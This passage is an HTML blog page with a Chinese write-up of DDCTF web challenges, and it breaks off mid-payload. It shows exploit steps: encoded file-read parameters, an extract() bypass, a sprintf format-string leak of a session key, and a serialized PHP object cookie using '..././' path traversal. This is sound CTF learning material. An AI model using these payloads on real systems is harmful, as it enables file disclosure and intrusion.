@@ -1,0 +1,1621 @@
+<!DOCTYPE html>
+
+
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="记录一下这两次比赛的PHP代码审计思路">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DD &amp;&amp; 国赛 PHP代码审计">
+<meta property="og:url" content="http://yoursite.com/2019/05/10/DD-国赛-PHP代码审计/index.html">
+<meta property="og:site_name" content="gtfly">
+<meta property="og:description" content="记录一下这两次比赛的PHP代码审计思路">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.imgur.com/2yyoVTl.png">
+<meta property="og:image" content="https://i.imgur.com/Mr0l4Wi.png">
+<meta property="og:image" content="https://i.imgur.com/TtVEzNf.png">
+<meta property="og:image" content="https://i.imgur.com/OodLZiw.png">
+<meta property="og:image" content="https://i.imgur.com/UDiBQj7.png">
+<meta property="og:image" content="https://i.imgur.com/1vhlC1C.png">
+<meta property="og:image" content="https://i.imgur.com/7VR9ZN5.png">
+<meta property="og:image" content="https://i.imgur.com/dwDonPp.png">
+<meta property="og:image" content="https://i.imgur.com/r7eABdp.png">
+<meta property="og:image" content="https://i.imgur.com/ccXoMXd.png">
+<meta property="og:image" content="https://i.imgur.com/oxZELKr.png">
+<meta property="og:image" content="https://i.imgur.com/cY2KMoG.png">
+<meta property="og:image" content="https://i.imgur.com/FeGjeXc.png">
+<meta property="og:updated_time" content="2019-05-18T18:02:50.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DD &amp;&amp; 国赛 PHP代码审计">
+<meta name="twitter:description" content="记录一下这两次比赛的PHP代码审计思路">
+<meta name="twitter:image" content="https://i.imgur.com/2yyoVTl.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeIn","post_body":"fadeIn","coll_header":"fadeIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/05/10/DD-国赛-PHP代码审计/">
+
+
+
+
+
+  <title>DD && 国赛 PHP代码审计 | gtfly</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><script> 
+ function GetRandomNum(Min,Max) 
+ { 
+    var Range = Max - Min; 
+    var Rand = Math.random(); 
+    return(Min + Math.round(Rand * Range)); 
+ } 
+ function setSidebarMarginTop (headerOffset) { 
+    return $('#sidebar').css({ 'margin-top': headerOffset }); 
+ } 
+ function getHeaderOffset () { 
+    return $('.header-inner').height() + CONFIG.sidebar.offset; 
+ }
+    window.onload=function() { 
+    var subtitle = "人生如逆旅，我亦是行人。"; 
+    var mytitle = subtitle.split("W"); 
+    var max = mytitle.length-1;
+    var index = GetRandomNum(0,max); 
+    var text = mytitle[index]; 
+    $("#helloTitle").html(text); 
+    var headOffset = getHeaderOffset(); 
+    setSidebarMarginTop(headOffset); 
+// alert(getHeaderOffset()); 
+ }  
+</script>
+
+<div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">gtfly</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人生如逆旅，我亦是行人。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-resource">
+          <a href="https://github.com/gtfly?tab=stars" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-star"></i> <br>
+            
+            资源
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-paper-plane"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/10/DD-国赛-PHP代码审计/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="gtfly">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="gtfly">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">DD && 国赛 PHP代码审计</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-10T09:19:53+08:00">
+                2019-05-10
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-05-19T02:02:50+08:00">
+                2019-05-19
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/05/10/DD-国赛-PHP代码审计/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/05/10/DD-国赛-PHP代码审计/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>记录一下这两次比赛的PHP代码审计思路</p>
+<a id="more"></a>
+
+<h3 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h3><p><img src="https://i.imgur.com/2yyoVTl.png" alt></p>
+<p>查看网页源码，发现这些是图片的Data Url scheme；观察链接，发现jpg后面的参数是base编码，进行解码；两次base64解码，一次16进制解码得到<code>flag.jpg</code></p>
+<p>则尝试把参数改为<code>index.php</code>，将其一次16进制编码、两次base64编码，即：</p>
+<pre><code>jpg=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></pre><p>虽然页面看起来图片是损坏的，但页面源码出现了Data Url scheme</p>
+<p><img src="https://i.imgur.com/Mr0l4Wi.png" alt></p>
+<p><img src="https://i.imgur.com/TtVEzNf.png" alt></p>
+<p>三次解码，得到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>提示<code>Can you find the flag file?</code>，在代码开头的博客中找到了提示：</p>
+<p><img src="https://i.imgur.com/OodLZiw.png" alt></p>
+<p><img src="https://i.imgur.com/UDiBQj7.png" alt></p>
+<p>之后将<code>practice.txt.swp</code>编码后访问，解码得到：</p>
+<pre><code>f1ag!ddctf.php</code></pre><p>根据index.php中的：</p>
+<pre><code>$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);</code></pre><p>其中，正则表达式语法：</p>
+<ul>
+<li><code>^</code> ：放在<code>[]</code>中表示排除</li>
+<li><code>.</code> ：在<code>[]</code>中就表示点，而不是表示除换行符以外的字符…</li>
+<li><code>+</code> ：至少一次</li>
+</ul>
+<p>即除了大小写字母、数字、小数点，其他字符都要被替换为空；那么要直接构造访问<code>f1ag!ddctf.php</code>，则会将<code>!</code>替换为空，从而访问失败；再根据：</p>
+<pre><code>$file = str_replace(&quot;config&quot;,&quot;!&quot;, $file);</code></pre><p>即可以用<code>config</code>进行替换，构造：</p>
+<pre><code>f1agconfigddctf.php</code></pre><p>进行编码传参，即可得到<code>f1ag!ddctf.php</code>的源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$k = <span class="string">'hello'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="keyword">if</span>($uid==$content)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span><span class="string">'hello'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>之后，访问<code>f1ag!ddctf.php</code>，构造</p>
+<pre><code>http://117.51.150.246/f1ag!ddctf.php?uid</code></pre><p>即可得到flag</p>
+<h3 id="WEB-签到题"><a href="#WEB-签到题" class="headerlink" title="WEB 签到题"></a>WEB 签到题</h3><p><img src="https://i.imgur.com/1vhlC1C.png" alt></p>
+<p>查看源码，发现有这样一个js文件：</p>
+<p><img src="https://i.imgur.com/7VR9ZN5.png" alt></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: didi</span></span><br><span class="line"><span class="comment"> * Date: 2019/1/13</span></span><br><span class="line"><span class="comment"> * Time: 9:05 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"post"</span>,</span><br><span class="line">        url:<span class="string">"http://117.51.158.44/app/Auth.php"</span>,</span><br><span class="line">        contentType: <span class="string">"application/json;charset=utf-8"</span>,</span><br><span class="line">        dataType: <span class="string">"json"</span>,</span><br><span class="line">        beforeSend: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest</span>) </span>&#123;</span><br><span class="line">            XMLHttpRequest.setRequestHeader(<span class="string">"didictf_username"</span>, <span class="string">""</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">getdata</span>) </span>&#123;</span><br><span class="line">           <span class="built_in">console</span>.log(getdata);</span><br><span class="line">           <span class="keyword">if</span>(getdata.data !== <span class="string">''</span>) &#123;</span><br><span class="line">               <span class="built_in">document</span>.getElementById(<span class="string">'auth'</span>).innerHTML = getdata.data;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;,<span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params">error</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到其目标网址是<code>http://117.51.158.44/app/Auth.php</code>，访问后显示：</p>
+<pre><code>{&quot;errMsg&quot;:&quot;error&quot;,&quot;data&quot;:&quot;\u62b1\u6b49\uff0c\u60a8\u6ca1\u6709\u767b\u9646\u6743\u9650\uff0c\u8bf7\u83b7\u53d6\u6743\u9650\u540e\u8bbf\u95ee-----&quot;}</code></pre><p>解码得到：</p>
+<pre><code>抱歉，您没有登陆权限，请获取权限后访问</code></pre><p>还发现js代码将headers中的<code>didictf_username</code>的值设置为了空，则用弱用户名<code>admin</code>，成功获得权限：</p>
+<p><img src="https://i.imgur.com/dwDonPp.png" alt></p>
+<p>解码得到：</p>
+<pre><code>{&quot;errMsg&quot;:&quot;success&quot;,&quot;data&quot;:&quot;您当前当前权限为管理员----请访问:app\/fL2XID2i0Cdh.php&quot;}</code></pre><p>访问得到php代码(太多了不贴了); {% btn https://myqinshimoon.github.io/fL2XID2i0Cdh.php, 点击下载源代码, download  %}</p>
+<p>有以下关键代码段：</p>
+<p>app/Application.php，Application类：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有个<code>file_get_contents</code>函数可以读取文件内容，并返回<code>Congratulations</code>，说明要想办法调用这个类的<code>__destruct</code>方法</p>
+<p>app/Session.php，Session类：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于path的长度要等于18，则可以推测flag文件可能为<code>../config/flag.txt</code>；</p>
+<p>app/Session.php，Session类：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$hash = substr($session,strlen($session)<span class="number">-32</span>);    <span class="comment"># 倒着截取32位，即[-32:]</span></span><br><span class="line">$session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);  <span class="comment"># 截取到-32位，即[:-32]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;   <span class="comment"># $hash要等于eancrykey拼接$session的md5值</span></span><br><span class="line">    <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$session = unserialize($session);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>若要利用反序列化，则需要得到eancrykey的值；可以通过下面的代码段获得：</p>
+<p>app/Session.php，Session类：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">    $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">    $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        $data = sprintf($data,$v);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么，既然这个if前面有个判断</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123; </span><br><span class="line"><span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>，如何绕过这个比较？其实，开始不设置Cookie的时候，会自动调用session_create()这个方法，返回的set-Cookie的值就可以绕过。。。</p>
+<p><img src="https://i.imgur.com/r7eABdp.png" alt></p>
+<p>之后，利用nickname获得eancrykey的值；相关函数：</p>
+<p>sprintf()：把格式化的字符串写入一个变量中，如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$number = <span class="number">9</span>;</span><br><span class="line">$str = <span class="string">"RUNOOB"</span>;</span><br><span class="line">$txt = sprintf(<span class="string">"%s 每天有 %u 万人在访问！"</span>, $str, $number);</span><br><span class="line"><span class="keyword">echo</span> $txt;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//输出：</span></span><br><span class="line"><span class="comment">//RUNOOB 每天有 9 万人在访问！</span></span><br></pre></td></tr></table></figure>
+
+<p>该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。</p>
+<p>由于$arr中只有两个值，且$data中只有一个格式化符号，则只会把$_POST[‘nickname’]替换到$data中</p>
+<p>因此，构造的nickname的值含有%s，即可获得第二个参数，即eancrykey的值</p>
+<p>这里用burp有点小坑，post传参的时候要加上<code>Content-Type: application/x-www-form-urlencoded</code>，不然post无效</p>
+<p><img src="https://i.imgur.com/ccXoMXd.png" alt></p>
+<p>得到了eancrykey的值为<code>EzblrbNS</code></p>
+<p>原Cookie中的值：</p>
+<pre><code>ddctf_id=a:4:{s:10:&quot;session_id&quot;;s:32:&quot;8627a92b4d383045570a8ca46b7f41f3&quot;;
+s:10:&quot;ip_address&quot;;s:13:&quot;123.52.105.90&quot;;s:10:&quot;user_agent&quot;;s:115:&quot;Mozilla/
+5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)
++Chrome/74.0.3729.131+Safari/537.36&quot;;s:9:&quot;user_data&quot;;s:0:&quot;&quot;;}
+05eabd341b070b92a0ae3a2d21e68ed2;</code></pre><p>利用Application类构造payload，由于path中的<code>../</code>被替换为空，则可进行双写绕过：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span></span>&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Application();</span><br><span class="line">$a-&gt;path=<span class="string">'..././config/flag.txt'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<pre><code>O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;} </code></pre><p>由于session反序列化后是个数组，则构造：</p>
+<pre><code>ddctf_id=a:5:{s:10:&quot;session_id&quot;;s:32:&quot;8627a92b4d383045570a8ca46b7f41f3&quot;;
+s:10:&quot;ip_address&quot;;s:13:&quot;123.52.105.90&quot;;s:10:&quot;user_agent&quot;;s:115:&quot;Mozilla/
+5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)
++Chrome/74.0.3729.131+Safari/537.36&quot;;s:9:&quot;user_data&quot;;s:0:&quot;&quot;;s:7:&quot;payload&quot;;
